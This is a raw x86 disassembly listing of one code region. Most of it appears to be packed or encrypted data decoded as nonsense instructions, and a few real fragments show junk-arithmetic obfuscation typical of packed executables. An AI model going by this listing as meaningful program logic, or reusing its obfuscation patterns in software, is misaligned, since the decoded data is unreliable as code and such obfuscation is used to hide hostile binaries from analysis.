  40cd9c:	cmp    BYTE PTR ds:0x3ffce034,bh
  40cda2:	fld    DWORD PTR [esi+0x4bac7e29]
  40cda8:	or     edi,DWORD PTR [edi+0x7232d0fb]
  40cdae:	or     eax,0xec70f664
  40cdb3:	iret   
  40cdb4:	inc    edi
  40cdb5:	pop    ss
  40cdb6:	cmp    BYTE PTR [edx],bh
  40cdb8:	mov    ebx,0x5f7a7ef0
  40cdbd:	retf   
  40cdbe:	je     0x40ce06
  40cdc0:	cli    
  40cdc1:	fistp  QWORD PTR [ecx]
  40cdc3:	aad    0xc6
  40cdc5:	(bad)  
  40cdc6:	fsubr  QWORD PTR [edi]
  40cdc8:	fsub   DWORD PTR [ebp-0x40]
  40cdcb:	test   al,0x2e
  40cdcd:	mov    cl,0x50
  40cdcf:	push   ds
  40cdd0:	ffreep st(1)
  40cdd2:	repnz test edx,ecx
  40cdd5:	cmc    
  40cdd6:	mov    bh,0x48
  40cdd8:	pop    es
  40cdd9:	push   ebp
  40cdda:	shl    DWORD PTR [ecx+ebp*4+0x6ec50d41],cl
  40cde1:	cmp    BYTE PTR [ebp-0x15],bl
  40cde4:	rcr    DWORD PTR [esi+0x2b],0xc6
  40cde8:	dec    eax
  40cde9:	xor    BYTE PTR [edi+0xd58359],0x46
  40cdf0:	mov    dh,BYTE PTR [eax]
  40cdf2:	(bad)  
  40cdf4:	mov    al,ds:0xe99afb54
  40cdf9:	push   edi
  40cdfa:	xchg   edx,eax
  40cdfb:	push   ebx
  40cdfc:	data16 mov dh,0xbf
  40cdff:	retf   
  40ce00:	scas   al,BYTE PTR es:[edi]
  40ce01:	out    dx,al
  40ce02:	repz sbb cl,bl
  40ce05:	mov    ebp,?
  40ce07:	popa   
  40ce08:	(bad)  
  40ce0a:	pop    eax
  40ce0b:	mov    bl,0x81
  40ce0d:	mov    esi,0xd42bf465
  40ce12:	or     BYTE PTR [esi+ebp*1+0x18efc5e8],0x8e
  40ce1a:	sub    DWORD PTR [edx],esi
  40ce1c:	fadd   st,st(4)
  40ce1e:	dec    esi
  40ce1f:	pop    ecx
  40ce20:	mov    al,ds:0xa0a45a55
  40ce25:	push   edi
  40ce26:	pop    ebp
  40ce27:	sti    
  40ce28:	aas    
  40ce29:	xchg   DWORD PTR [ebx+0x2],ebx
  40ce2c:	xchg   esi,eax
  40ce2d:	stos   BYTE PTR es:[edi],al
  40ce2e:	repz pushw es
  40ce31:	(bad)  
  40ce32:	xchg   ebx,eax
  40ce33:	xlat   BYTE PTR ds:[ebx]
  40ce34:	div    BYTE PTR [ebx-0x7ef5aa05]
  40ce3a:	xor    DWORD PTR [eax+0x27c6b79f],esp
  40ce40:	adc    BYTE PTR [ebx+eax*1-0x57fa4339],0xfb
  40ce48:	aas    
  40ce49:	test   cl,dh
  40ce4b:	cmp    al,0xd9
  40ce4d:	out    0x1a,al
  40ce4f:	hlt    
  40ce50:	sahf   
  40ce51:	ss cld 
  40ce53:	lar    ebp,WORD PTR [ecx+0x2bb845f6]
  40ce5a:	test   eax,0x183dcf02
  40ce5f:	push   ds
  40ce60:	pop    eax
  40ce61:	test   eax,0x6afc63d0
  40ce66:	sahf   
  40ce67:	pop    ebp
  40ce68:	xor    eax,DWORD PTR [esi]
  40ce6a:	test   BYTE PTR [edx],ch
  40ce6c:	or     al,0x64
  40ce6e:	clc    
  40ce6f:	ins    DWORD PTR es:[edi],dx
  40ce70:	mov    ah,0x7a
  40ce72:	xchg   esi,eax
  40ce73:	fmul   DWORD PTR ds:0x5780a49f
  40ce79:	xchg   ecx,eax
  40ce7a:	pop    esp
  40ce7b:	adc    al,BYTE PTR [ebp-0x4453535a]
  40ce81:	enter  0xf50c,0x56
  40ce85:	fidivr WORD PTR [ebx]
  40ce87:	mov    ds,WORD PTR [ebp-0x57]
  40ce8a:	inc    eax
  40ce8b:	mov    edi,0x62361b8c
  40ce90:	mov    ds:0xf99dcebe,al
  40ce95:	jecxz  0x40cf16
  40ce97:	push   ds
  40ce98:	std    
  40ce99:	shl    BYTE PTR [ebp-0x47f28a4e],1
  40ce9f:	xor    DWORD PTR [edx-0x7e],0xffffffa7
  40cea3:	xchg   ecx,eax
  40cea4:	out    0x8f,al
  40cea6:	or     bh,BYTE PTR [ebp-0x3b8437a7]
  40ceac:	sar    DWORD PTR [esi],cl
  40ceae:	and    al,BYTE PTR [edx-0x43]
  40ceb1:	idiv   BYTE PTR [edi+0x6e16c031]
  40ceb7:	outs   dx,BYTE PTR ds:[esi]
  40ceb8:	aad    0x17
  40ceba:	cli    
  40cebb:	jle    0x40cecd
  40cebd:	cmp    DWORD PTR [esi+edi*2],esi
  40cec0:	lods   al,BYTE PTR ds:[esi]
  40cec1:	imul   esi,DWORD PTR [ebx+0x17bfcf76],0xf80823e8
  40cecb:	mov    cl,0xa4
  40cecd:	xor    eax,0xfdf9e2
  40ced2:	shr    BYTE PTR [eax-0xb77c66],cl
  40ced8:	or     BYTE PTR [ebx+eax*1-0x1e],bl
  40cedc:	pop    ss
  40cedd:	test   eax,0xf68a1347
  40cee2:	ret    
  40cee3:	sbb    ebx,edx
  40cee5:	jle    0x40cf1f
  40cee7:	dec    eax
  40cee8:	ins    DWORD PTR es:[edi],dx
  40cee9:	pop    eax
  40ceea:	jno    0x40ce7f
  40ceec:	sub    BYTE PTR [ebp+0x53a5d6d6],ch
  40cef2:	or     eax,ebp
  40cef4:	fistp  DWORD PTR [ebp-0x52]
  40cef7:	in     al,0xde
  40cef9:	pop    esp
  40cefa:	xchg   edi,eax
  40cefb:	test   eax,0xeb9568ea
  40cf00:	outs   dx,DWORD PTR ds:[esi]
  40cf01:	popa   
  40cf02:	ret    0xeba6
  40cf05:	push   ds
  40cf06:	xor    eax,0x9edd01ff
  40cf0b:	mov    edi,0x7ee0a1f7
  40cf10:	dec    ebx
  40cf11:	mov    bl,0xd4
  40cf13:	scas   al,BYTE PTR es:[edi]
  40cf14:	jb     0x40cf23
  40cf16:	cmp    al,0xf8
  40cf18:	jmp    0x53ae:0xed929062
  40cf1f:	dec    esi
  40cf20:	adc    al,0xd0
  40cf22:	fsub   st(1),st
  40cf24:	xchg   ebx,eax
  40cf25:	add    eax,0x70128cff
  40cf2a:	retf   0x7f30
  40cf2d:	ins    DWORD PTR es:[edi],dx
  40cf2e:	mov    ss,WORD PTR [ecx+0x59d9b410]
  40cf34:	dec    ebx
  40cf35:	shl    DWORD PTR [edi+0x1d],cl
  40cf38:	int    0x49
  40cf3a:	push   cs
  40cf3b:	jp     0x40cf2f
  40cf3d:	jo     0x40cf75
  40cf3f:	out    0xc5,eax
  40cf41:	in     al,0x76
  40cf43:	and    eax,0x1f936a57
  40cf48:	(bad)  
  40cf49:	pop    esi
  40cf4a:	cli    
  40cf4b:	in     al,dx
  40cf4c:	cmp    al,0xd0
  40cf4e:	sbb    ebx,edi
  40cf50:	sub    eax,0x6ca9914f
  40cf55:	xchg   ecx,eax
  40cf56:	inc    esi
  40cf57:	and    bl,BYTE PTR [ebx-0x1105e6a6]
  40cf5d:	xchg   BYTE PTR [ecx],ch
  40cf5f:	xor    eax,0x6693c178
  40cf64:	pop    eax
  40cf65:	inc    eax
  40cf66:	stc    
  40cf67:	retf   
  40cf68:	test   DWORD PTR [edx+eax*4],esp
  40cf6b:	xchg   esi,eax
  40cf6c:	xor    edi,DWORD PTR [edi]
  40cf6e:	repnz retf 
  40cf70:	stos   BYTE PTR es:[edi],al
  40cf71:	lahf   
  40cf72:	jae    0x40cf87
  40cf74:	xor    ecx,DWORD PTR [ebx+esi*8]
  40cf77:	outs   dx,DWORD PTR ds:[esi]
  40cf78:	ret    
  40cf79:	add    BYTE PTR [ebx-0x3ac6fabb],dl
  40cf7f:	or     esp,DWORD PTR [edx+0x6]
  40cf82:	xor    eax,0xd71164e9
  40cf87:	cmp    al,0xc0
  40cf89:	inc    esi
  40cf8a:	sub    edx,DWORD PTR ds:0xe655840f
  40cf90:	(bad)  
  40cf91:	(bad)  
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfcb:	and    al,0xda
  40cfcd:	pop    es
  40cfce:	sub    ah,BYTE PTR [edi+0x7e357878]
  40cfd4:	js     0x40d04e
  40cfd6:	(bad)  ds:0xc151ec34
  40cfdc:	and    eax,0x74b7247d
  40cfe1:	shl    BYTE PTR [eax],1
  40cfe3:	sub    eax,0xdc11c4e8
  40cfe8:	dec    eax
  40cfe9:	adc    ebx,DWORD PTR [edx-0x7c179fce]
  40cfef:	or     al,0xca
  40cff1:	jne    0x40cf85
  40cff3:	jecxz  0x40d02c
  40cff5:	rol    DWORD PTR [eax+ebp*2],cl
  40cff8:	sti    
  40cff9:	mov    bh,0x3b
  40cffb:	add    eax,0x7e833226
  40d000:	push   esi
  40d001:	pop    ss
  40d002:	mov    bl,0xd7
  40d004:	(bad)
  40d007:	sahf   
  40d008:	sahf   
  40d009:	adc    ebx,ebx
  40d00b:	dec    esi
  40d00c:	aam    0x9c
  40d00e:	jge    0x40d00c
  40d010:	adc    BYTE PTR [edx],dl
  40d012:	jbe    0x40d03d
  40d014:	lock jno 0x40d039
  40d017:	loope  0x40d00c
  40d019:	mov    eax,0x93a2047d
  40d01e:	das    
  40d01f:	adc    esi,DWORD PTR [ecx-0x7e]
  40d022:	push   ds
  40d023:	cmp    BYTE PTR [esp+ebp*1-0x19],bl
  40d027:	js     0x40cfda
  40d029:	jnp    0x40d090
  40d02b:	xor    bl,BYTE PTR [ecx+0x5a4cb631]
  40d031:	mov    esp,ecx
  40d033:	jnp    0x40d083
  40d035:	mov    WORD PTR [esi+0xd21da9f],fs
  40d03b:	jae    0x40d06b
  40d03d:	imul   edi,ebp,0x1c27ca20
  40d043:	es inc ecx
  40d045:	sub    DWORD PTR [edi],edi
  40d047:	stos   DWORD PTR es:[edi],eax
  40d048:	out    0x62,al
  40d04a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d04b:	rol    BYTE PTR [ecx+0x70c9c9aa],0x2f
  40d052:	fstp   DWORD PTR [ebx]
  40d054:	cmp    al,0x22
  40d056:	xchg   edi,eax
  40d057:	jno    0x40d061
  40d059:	or     al,0x47
  40d05b:	imul   esp,DWORD PTR [ecx+0x29],0xffffffc8
  40d05f:	push   cs
  40d060:	loopne 0x40d085
  40d062:	das    
  40d063:	out    dx,al
  40d064:	mov    ebx,0x588b11c9
  40d069:	sbb    bl,BYTE PTR [edx+0x2d]
  40d06c:	lahf   
  40d06d:	push   si
  40d06f:	xchg   ecx,eax
  40d070:	push   esp
  40d071:	pusha  
  40d072:	js     0x40d009
  40d074:	stos   DWORD PTR es:[edi],eax
  40d075:	loop   0x40d056
  40d077:	sub    BYTE PTR [ebp-0x3b3ccef],cl
  40d07d:	test   eax,0xe0cffde9
  40d082:	inc    ebx
  40d083:	lea    edi,[eax+0x37a9cda5]
  40d089:	xor    dh,BYTE PTR [esi]
  40d08b:	xlat   BYTE PTR ds:[ebx]
  40d08c:	and    DWORD PTR [ebx+0x7b8e7982],esi
  40d092:	pop    ebx
  40d093:	sub    eax,0x9d7ac88a
  40d098:	stos   BYTE PTR es:[edi],al
  40d099:	sub    BYTE PTR [eax],dh
  40d09b:	mov    WORD PTR [esi-0x63],ss
  40d09e:	adc    BYTE PTR [edx],ah
  40d0a0:	stos   DWORD PTR es:[edi],eax
  40d0a1:	xchg   esi,eax
  40d0a2:	mov    bl,0x58
  40d0a4:	xchg   edx,eax
  40d0a5:	or     eax,0x1e6dfa56
  40d0aa:	mov    edx,0x443ad8e7
  40d0af:	cmp    ch,BYTE PTR [edi]
  40d0b1:	pushf  
  40d0b2:	or     eax,0x415ebf33
  40d0b7:	pop    edx
  40d0b8:	inc    ebx
  40d0b9:	sub    eax,DWORD PTR [ebp+0x4e]
  40d0bc:	jno    0x40d119
  40d0be:	push   ebp
  40d0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0c0:	jmp    0x3c32:0x3fc1886b
  40d0c7:	cwde   
  40d0c8:	cli    
  40d0c9:	cmp    esp,esp
  40d0cb:	cdq    
  40d0cc:	jns    0x40d078
  40d0ce:	popa   
  40d0cf:	repnz ins BYTE PTR es:[edi],dx
  40d0d1:	fisub  DWORD PTR [eax-0x9]
  40d0d4:	leave  
  40d0d5:	hlt    
  40d0d6:	xchg   ecx,eax
  40d0d7:	adc    eax,0x8b12b26c
  40d0dc:	jp     0x40d13d
  40d0de:	jne    0x40d0d3
  40d0e0:	xor    ecx,esp
  40d0e2:	cmc    
  40d0e3:	rol    DWORD PTR [edi-0x5b],0xa1
  40d0e7:	pop    ebp
  40d0e8:	jne    0x40d15c
  40d0ea:	mov    cl,0xc8
  40d0ec:	ds sahf 
  40d0ee:	and    ch,cl
  40d0f0:	push   ebx
  40d0f1:	stc    
  40d0f2:	test   eax,0x8bd84d25
  40d0f7:	push   edi
  40d0f8:	jae    0x40d172
  40d0fa:	mov    dl,0xa8
  40d0fc:	jecxz  0x40d141
  40d0fe:	mov    dl,0xd1
  40d100:	mov    dl,0x21
  40d102:	jmp    0x207b22f4
  40d107:	xor    al,0x33
  40d109:	xchg   esi,eax
  40d10a:	stos   BYTE PTR es:[edi],al
  40d10b:	das    
  40d10c:	mov    al,0xf6
  40d10e:	cwde   
  40d10f:	ss (bad) 
  40d111:	fdiv   QWORD PTR [ebx-0x4e]
  40d114:	mov    al,0x45
  40d116:	pop    ebp
  40d117:	jl     0x40d0c0
  40d119:	inc    ecx
  40d11a:	fidiv  WORD PTR [ebx+edi*1]
  40d11d:	loope  0x40d0cf
  40d11f:	arpl   WORD PTR [eax+0x43],sp
  40d122:	popf   
  40d123:	mov    cs,WORD PTR [edi-0x5c50ee21]
  40d129:	bound  eax,QWORD PTR [edi+esi*4]
  40d12c:	inc    edi
  40d12d:	xchg   edi,eax
  40d12e:	aam    0x8b
  40d130:	cmc    
  40d131:	add    DWORD PTR [ebx+0x2],esp
  40d134:	cmp    eax,0x296c34de
  40d139:	push   es
  40d13a:	jnp    0x40d140
  40d13c:	pop    edi
  40d13d:	test   al,0xec
  40d13f:	dec    ecx
  40d140:	jbe    0x40d102
  40d142:	push   edx
  40d143:	mov    edx,0xcfbcefc3
  40d148:	mov    ebp,0x83a20599
  40d14d:	iret   
  40d14e:	push   edx
  40d14f:	ror    DWORD PTR [edi-0x22c5f487],1
  40d155:	inc    esp
  40d156:	xchg   ebx,eax
  40d157:	add    eax,0x8aff22ec
  40d15c:	out    dx,eax
  40d15d:	call   0x9ec1c33e
  40d162:	repz lock test al,0xdf
  40d166:	jbe    0x40d1e2
  40d168:	xchg   ebp,eax
  40d169:	or     al,0x86
  40d16b:	bnd call DWORD PTR [edi]
  40d16e:	or     DWORD PTR [edi-0x1806e444],esi
  40d174:	push   edx
  40d175:	mov    dh,0xee
  40d177:	or     edi,DWORD PTR [esi]
  40d179:	data16 idiv BYTE PTR [edi+0xc]
  40d17d:	xor    ecx,ebx
  40d17f:	scas   eax,DWORD PTR es:[edi]
  40d180:	mov    edx,0xc116e5f2
  40d185:	adc    DWORD PTR [esp+ebx*1+0x16a43e0f],0xffffffef
  40d18d:	or     BYTE PTR [ebp-0x65],ch
  40d190:	push   0x35d8a966
  40d195:	pop    ecx
  40d196:	inc    ecx
  40d197:	ret    0x492d
  40d19a:	call   0x9bd:0x3a6f50f3
  40d1a1:	push   edi
  40d1a2:	(bad)  
  40d1a3:	pop    ebp
  40d1a4:	es (bad) 
  40d1a6:	adc    al,BYTE PTR [eax-0x69ac6d5d]
  40d1ac:	pusha  
  40d1ad:	mov    ebx,0xca3a4f07
  40d1b2:	arpl   WORD PTR [ebx+0x3a],cx
  40d1b5:	lahf   
  40d1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1b7:	fcom   QWORD PTR [edx-0x7]
  40d1ba:	test   bh,0xab
  40d1bd:	xchg   esi,eax
  40d1be:	rep ins BYTE PTR es:[edi],dx
  40d1c0:	push   DWORD PTR [edi+esi*2+0x1c]
  40d1c4:	aas    
  40d1c5:	mov    edx,DWORD PTR [ebp+0x5b]
  40d1c8:	call   0xecbdb832
  40d1cd:	in     eax,0x16
  40d1cf:	jne    0x40d23e
  40d1d1:	loope  0x40d177
  40d1d3:	xchg   esi,eax
  40d1d4:	push   ebx
  40d1d5:	clc    
  40d1d6:	sbb    eax,0x68e5a4be
  40d1db:	adc    bl,BYTE PTR [ebx-0x7b]
  40d1de:	push   esp
  40d1df:	mov    BYTE PTR [ecx],bh
  40d1e1:	sub    DWORD PTR [edi],esp
  40d1e3:	cmp    edx,edx
  40d1e5:	mov    ds:0x4ce2c07,eax
  40d1ea:	ss ins BYTE PTR es:[edi],dx
  40d1ec:	jb     0x40d183
  40d1ee:	mov    dh,0xc6
  40d1f0:	and    bl,cl
  40d1f2:	sar    DWORD PTR [edi],cl
  40d1f4:	push   edx
  40d1f5:	mov    esp,0x31296da6
  40d1fa:	fcom   QWORD PTR [ebx]
  40d1fc:	sbb    ebx,DWORD PTR [ebx+0x1f0ef742]
  40d202:	ins    BYTE PTR es:[edi],dx
  40d203:	jne    0x40d25b
  40d205:	pushf  
  40d206:	aam    0x2e
  40d208:	jmp    0x75e1f103
  40d20d:	add    BYTE PTR [edx+0x56536edb],bl
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	js     0x40d24d
  40d2bb:	dec    ebp
  40d2bc:	aas    
  40d2bd:	out    0xa5,eax
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0xce78787e
  40d2c6:	and    ebx,DWORD PTR [edi]
  40d2c8:	pop    es
  40d2c9:	daa    
  40d2ca:	dec    ebx
  40d2cb:	int3   
  40d2cc:	xor    eax,0xd784c798
  40d2d1:	aad    0x61
  40d2d3:	mov    ch,0x1
  40d2d5:	fstp   TBYTE PTR ds:0x2683da1b
  40d2db:	mov    eax,0xefabd373
  40d2e0:	jge    0x40d2d5
  40d2e2:	fcompp 
  40d2e4:	mov    ecx,0x5be5817
  40d2e9:	jo     0x40d360
  40d2eb:	out    dx,eax
  40d2ec:	imul   ecx,DWORD PTR [edi],0xffffffde
  40d2ef:	jl     0x40d36a
  40d2f1:	lahf   
  40d2f2:	mov    DWORD PTR [ebx],ebx
  40d2f4:	ret    
  40d2f5:	ins    DWORD PTR es:[edi],dx
  40d2f6:	dec    edx
  40d2f7:	and    eax,0xa0f8ffe3
  40d2fc:	call   0xf1246dfb
  40d301:	mov    cl,0x7b
  40d303:	cli    
  40d304:	mov    esp,0xae719403
  40d309:	adc    eax,0xcabe3b0
  40d30e:	das    
  40d30f:	sbb    DWORD PTR [edi+0x201f49e6],edx
  40d315:	repnz jmp FWORD PTR [ebx+0x5a]
  40d319:	xor    ch,0x6f
  40d31c:	aaa    
  40d31d:	mov    eax,ds:0xe421d4d7
  40d322:	js     0x40d397
  40d324:	(bad)  
  40d325:	jbe    0x40d348
  40d327:	push   es
  40d328:	xchg   BYTE PTR [ebp+0x5ebccde7],ch
  40d32e:	dec    ecx
  40d32f:	sti    
  40d330:	loope  0x40d395
  40d332:	mov    ds:0xcf250c59,al
  40d337:	and    dl,BYTE PTR [eax+0x6d5add11]
  40d33d:	xchg   ecx,eax
  40d33e:	sub    al,0xf3
  40d340:	lds    edx,FWORD PTR [edi]
  40d342:	fdivr  QWORD PTR [edi+0x4e]
  40d345:	mov    ah,0xe
  40d347:	outs   dx,BYTE PTR ds:[esi]
  40d348:	das    
  40d349:	out    0x58,al
  40d34b:	add    BYTE PTR [edx],0xb3
  40d34e:	(bad)  
  40d34f:	dec    esp
  40d350:	jl     0x40d2e8
  40d352:	mov    esp,cs
  40d354:	hlt    
  40d355:	call   0x714cfc86
  40d35a:	xor    bh,cl
  40d35c:	fist   DWORD PTR [eax-0x27]
  40d35f:	stos   DWORD PTR es:[edi],eax
  40d360:	mov    dl,0x69
  40d362:	and    eax,0x223c70ad
  40d367:	or     DWORD PTR [ecx+0x76],edi
  40d36a:	xchg   ebp,eax
  40d36b:	call   0x3746:0xfa0f08e
  40d372:	mov    fs,WORD PTR [edx]
  40d374:	fadd   QWORD PTR [ebx+0x1f]
  40d377:	cmp    edx,DWORD PTR [ecx-0x9]
  40d37a:	pop    ds
  40d37b:	and    ah,BYTE PTR [ecx+0x7f]
  40d37e:	(bad)  
  40d37f:	loopne 0x40d31f
  40d381:	test   BYTE PTR [esi+esi*2-0x3f],0x2
  40d386:	xor    bh,bh
  40d388:	call   0xb3dc3f66
  40d38d:	dec    edx
  40d38e:	push   ds
  40d38f:	add    al,0xc8
  40d391:	pop    esp
  40d392:	or     bh,BYTE PTR [eax-0x3b92db4]
  40d398:	sbb    ecx,DWORD PTR ds:0x986734bc
  40d39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d39f:	xchg   edx,eax
  40d3a0:	test   eax,0xf2a57de6
  40d3a5:	fs inc esi
  40d3a7:	sub    eax,0x81f6ee9
  40d3ac:	(bad)  
  40d3ad:	pop    esi
  40d3ae:	push   ds
  40d3af:	out    0xe0,eax
  40d3b1:	jb     0x40d400
  40d3b3:	jge    0x40d3ee
  40d3b5:	shl    ah,1
  40d3b7:	xchg   ecx,eax
  40d3b8:	or     DWORD PTR [ebp-0x3a],ebx
  40d3bb:	sub    BYTE PTR [edx-0x28fe611f],bl
  40d3c1:	aad    0x2e
  40d3c3:	lock mov ds:0x351b1781,eax
  40d3c9:	aas    
  40d3ca:	xchg   esi,eax
  40d3cb:	pop    ds
  40d3cc:	aad    0x46
  40d3ce:	sub    bh,BYTE PTR [edx+0x68e67e02]
  40d3d4:	dec    ecx
  40d3d5:	jae    0x40d35e
  40d3d7:	sbb    DWORD PTR [edx],0x80d08186
  40d3dd:	fistp  QWORD PTR [edx+0x603fe48a]
  40d3e3:	or     al,0xc0
  40d3e5:	es ret 
  40d3e7:	mov    bh,0x1c
  40d3e9:	mov    dl,0x67
  40d3eb:	sbb    eax,DWORD PTR [ebx]
  40d3ed:	out    0xe4,eax
  40d3ef:	(bad)  
  40d3f0:	push   ebp
  40d3f1:	push   esp
  40d3f2:	icebp  
  40d3f3:	xor    eax,0x30d57525
  40d3f8:	xor    esi,DWORD PTR ds:0xb4642490
  40d3fe:	adc    BYTE PTR [esi-0x6f],dh
  40d401:	dec    edx
  40d402:	pop    ebp
  40d403:	cmp    BYTE PTR [ebx+0x6df6f5bd],bh
  40d409:	ins    BYTE PTR es:[edi],dx
  40d40a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d40b:	push   es
  40d40c:	pusha  
  40d40d:	or     DWORD PTR [ecx],0x6
  40d410:	rcr    dl,1
  40d412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d413:	out    0x56,eax
  40d415:	outs   dx,BYTE PTR ds:[esi]
  40d416:	gs scas eax,DWORD PTR es:[edi]
  40d418:	fcmovbe st,st(7)
  40d41a:	and    ebx,ebp
  40d41c:	sub    bh,BYTE PTR [edi]
  40d41e:	mov    edi,ebp
  40d420:	loop   0x40d47d
  40d422:	xchg   DWORD PTR [ebp-0x12ed8758],ebp
  40d428:	pop    esp
  40d429:	icebp  
  40d42a:	popa   
  40d42b:	enter  0x159d,0xea
  40d42f:	stc    
  40d430:	sbb    ebp,DWORD PTR [esi+0x784634f4]
  40d436:	jl     0x40d48e
  40d438:	out    0xaa,al
  40d43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d43b:	scas   eax,DWORD PTR es:[edi]
  40d43c:	jl     0x40d45c
  40d43e:	sti    
  40d43f:	dec    ecx
  40d440:	pop    ebp
  40d441:	pop    eax
  40d442:	jnp    0x40d458
  40d444:	mov    BYTE PTR [esi+0x519c748b],bh
  40d44a:	xor    BYTE PTR [edx+0x49],cl
  40d44d:	outs   dx,DWORD PTR ds:[esi]
  40d44e:	fcom   DWORD PTR fs:[ebx]
  40d451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d452:	or     DWORD PTR [edx-0x5cf03be6],esi
  40d458:	pop    ebp
  40d459:	adc    BYTE PTR [ebx+0x715562ad],dl
  40d45f:	adc    al,0xd0
  40d461:	push   ebp
  40d462:	dec    ebx
  40d463:	lahf   
  40d464:	and    al,0x9e
  40d466:	jmp    0x96f1:0xefbadbf9
  40d46d:	ret    
  40d46e:	lods   eax,DWORD PTR ds:[esi]
  40d46f:	jne    0x40d43e
  40d471:	ins    BYTE PTR es:[edi],dx
  40d472:	cmp    al,0xa1
  40d474:	(bad)  
  40d475:	mov    edx,0xf03117fa
  40d47a:	or     ebx,esi
  40d47c:	pop    ebp
  40d47d:	js     0x40d432
  40d47f:	aas    
  40d480:	bound  esi,QWORD PTR [ecx]
  40d482:	pusha  
  40d483:	or     eax,ecx
  40d485:	test   eax,0xaffb4de1
  40d48a:	sahf   
  40d48b:	aaa    
  40d48c:	mov    bh,0xe
  40d48e:	jmp    0x69117f09
  40d493:	mov    fs,ecx
  40d495:	sub    edi,esi
  40d497:	jp     0x40d45c
  40d499:	stos   DWORD PTR es:[edi],eax
  40d49a:	arpl   WORD PTR [ebx],bp
  40d49c:	dec    esp
  40d49d:	push   ebp
  40d49e:	cmp    eax,DWORD PTR [eax+0xd15004f]
  40d4a4:	inc    eax
  40d4a5:	xchg   esi,eax
  40d4a6:	mov    edx,0x6cecf108
  40d4ab:	inc    ebx
  40d4ac:	out    0x8e,eax
  40d4ae:	sbb    al,0xd4
  40d4b0:	(bad)  
  40d4b1:	cld    
  40d4b2:	imul   eax,DWORD PTR ds:0xa6ff8b6f,0x75
  40d4b9:	cmp    eax,0xcd5b75cc
  40d4be:	jmp    FWORD PTR [edi+0x73]
  40d4c1:	adc    ebp,DWORD PTR [eax-0x7e]
  40d4c4:	push   eax
  40d4c5:	out    0x22,al
  40d4c7:	mov    ecx,0x2b27180
  40d4cc:	call   0x97e4:0xd7bae7bf
  40d4d3:	xchg   edx,eax
  40d4d4:	sar    DWORD PTR [ebx],0x34
  40d4d7:	lods   eax,DWORD PTR ds:[esi]
  40d4d8:	push   esi
  40d4d9:	aad    0xc5
  40d4db:	shl    ch,1
  40d4dd:	and    eax,0x73763f33
  40d4e2:	ret    
  40d4e3:	jmp    0x60696db3
  40d4e8:	in     al,dx
  40d4e9:	sub    esp,DWORD PTR [edx-0x27]
  40d4ec:	popa   
  40d4ed:	push   edi
  40d4ee:	int3   
  40d4ef:	mov    ch,0xbd
  40d4f1:	cmp    DWORD PTR [ecx+0x25bce302],ebp
  40d4f7:	sbb    eax,0xb43296e3
  40d4fc:	mov    dh,0x8c
  40d4fe:	imul   ebx,eax,0xffffffc7
  40d501:	inc    ebp
  40d502:	hlt    
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x580ada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR ds:0x30042a8,al
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
